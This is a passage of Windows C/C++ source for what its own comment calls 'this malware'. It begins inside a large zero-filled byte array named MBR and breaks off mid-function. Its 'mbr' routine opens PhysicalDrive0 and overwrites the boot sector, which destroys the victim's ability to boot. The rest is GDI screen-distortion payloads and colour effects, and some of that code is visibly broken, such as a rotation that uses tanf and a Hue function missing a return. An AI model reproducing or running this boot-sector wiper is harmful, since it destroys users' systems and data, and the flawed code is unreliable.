0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00 };

DWORD WINAPI mbr(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MBR, 32768, &Bytes, NULL);
    return 1;
}



VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    SelectObject(hdc, CreateSolidBrush(RANDRGB));
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI gdi_rotate(LPVOID)
{

    BitBlt(gRotDC, 0, 0, gw, gh, gMemDC, 0, 0, SRCCOPY);

    float cx = gw * 0.5f;
    float cy = gh * 0.5f;

    float s = tanf(gAngle);
    float c = cosf(gAngle);

    POINT p[3];

    float x0 = -cx, y0 = -cy;
    float x1 = cx, y1 = -cy;
    float x2 = -cx, y2 = cy;
    float x3 = cx, y3 = cy;

    float rx0 = x0 * c - y0 * s + cx;
    float ry0 = x0 * s + y0 * c + cy;
    float rx1 = x1 * c - y1 * s + cx;
    float ry1 = x1 * s + y1 * c + cy;
    float rx2 = x2 * c - y2 * s + cx;
    float ry2 = x2 * s + y2 * c + cy;
    float ry3 = x2 * s + y2 * c + cy;
    float rx3 = x3 * s + y3 * c + cy;

    p[0].x = (LONG)rx0; p[0].y = (LONG)ry0;
    p[1].x = (LONG)rx1; p[1].y = (LONG)ry1;
    p[2].x = (LONG)rx2; p[2].y = (LONG)ry2;

    PlgBlt(gMemDC, p, gRotDC, 0, 0, gw, gh, NULL, 0, 0);

    return 0;
}

LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l)
{
    if (m == WM_KEYDOWN && w == VK_ESCAPE) DestroyWindow(h);
    if (m == WM_DESTROY) PostQuitMessage(0);
    return DefWindowProc(h, m, w, l);
}
typedef struct _MYQUAD {
    BYTE R;
    BYTE G;
    BYTE B;
    BYTE Reserved;
} MYQUAD, * PMYQUAD;

struct Point3D {
    float x, y, z;
};

namespace Colors
{
    //These HSL functions was made by Wipet, credits to him!
    //OBS: I used it in 3 payloads

    //Btw ArTicZera created HSV functions, but it sucks unfortunatelly
    //So I didn't used in this malware.

    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = std::min(std::min(_r, _g), _b);
        FLOAT rgbMax = std::max(std::max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

HHOOK hMsgHook = NULL;

static inline DWORD MagmaColor(int x, int y, float t)
{
    float v =
        sinf(x * 0.02f + t * 1.2f) +
        sinf(y * 0.025f + t * 0.9f) +
        sinf((x + y) * 0.015f + t * 1.5f);

    v = (v + 3.0f) / 6.0f;

    int r = (int)(128 + 127 * sinf(v * 6.28f + t));
    int g = (int)(128 + 127 * sinf(v * 6.28f + t + 2.09f));
    int b = (int)(128 + 127 * sinf(v * 6.28f + t + 4.18f));

    return RGB(r, g, b);
}

BOOL CALLBACK MsgBoxRefreshWndProc(HWND hwnd, LPARAM lParam)
{
    RedrawWindow(hwnd, NULL, NULL, RDW_ERASE | RDW_INVALIDATE);
    return TRUE;
}

LRESULT CALLBACK WndProc2(HWND h, UINT m, WPARAM w, LPARAM l)
{
    if (m == WM_DESTROY) PostQuitMessage(0);
    return DefWindowProc(h, m, w, l);
}

VOID WINAPI MagmaBoxThread(HWND hwndMsgBox)
{
    BITMAPINFO bmi = { 0 };
    PMYQUAD prgbPixels;
    HDC hdcMsgBox;
    HDC hdcTemp;
    HBITMAP hbm;
    RECT rc;
    INT w, h;
    float t = 0.0f;

    GetWindowRect(hwndMsgBox, &rc);
    w = rc.right - rc.left;
    h = rc.bottom - rc.top;

    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;

    hdcMsgBox = GetDC(hwndMsgBox);
    hdcTemp = CreateCompatibleDC(hdcMsgBox);

    hbm = CreateDIBSection(hdcMsgBox, &bmi, DIB_RGB_COLORS, (void**)&prgbPixels, NULL, 0);
    SelectObject(hdcTemp, hbm);

    for (;;)
    {
        t += 0.08f;

        for (INT y = 0; y < h; y++)
        {
            for (INT x = 0; x < w; x++)
            {
                DWORD c = MagmaColor(x, y, t);
                prgbPixels[y * w + x].R = GetRValue(c);
                prgbPixels[y * w + x].G = GetGValue(c);
                prgbPixels[y * w + x].B = GetBValue(c);
                prgbPixels[y * w + x].Reserved = 0;
            }
        }

        BitBlt(hdcMsgBox, 0, 0, w, h, hdcTemp, 0, 0, SRCCOPY);

